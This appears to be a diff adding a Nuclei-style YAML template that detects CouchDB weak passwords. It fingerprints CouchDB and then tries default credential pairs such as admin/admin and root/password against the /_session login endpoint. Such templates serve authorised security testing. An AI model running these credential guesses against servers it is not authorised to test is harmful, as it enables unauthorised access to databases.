@@ -1,0 +1,63 @@
+id: poc-yaml-couchdb-weak-password
+info:
+  name: "CouchDB 弱口令漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: couchdb
+  description: |
+    This template detects weak password vulnerability in CouchDB by attempting to log in with common credentials.
+
+variables:
+  user:
+    - admin
+    - administrator
+    - couchdb
+    - root
+  passwd:
+    - admin
+    - test
+    - couchdb
+    - password
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-couchdb
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"couchdb\":"
+  - id: login-couchdb
+    method: POST
+    path:
+      - "{{BaseURL}}/_session"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: "name={{user}}&password={{passwd}}"
+    attack: pitchfork
+    payloads:
+      user:
+        - "{{user}}"
+      passwd:
+        - "{{passwd}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"ok\":true"
+          - "\"name\":"
+          - "\"roles\":["
+      - type: word
+        part: header
+        words:
+          - "AuthSession="
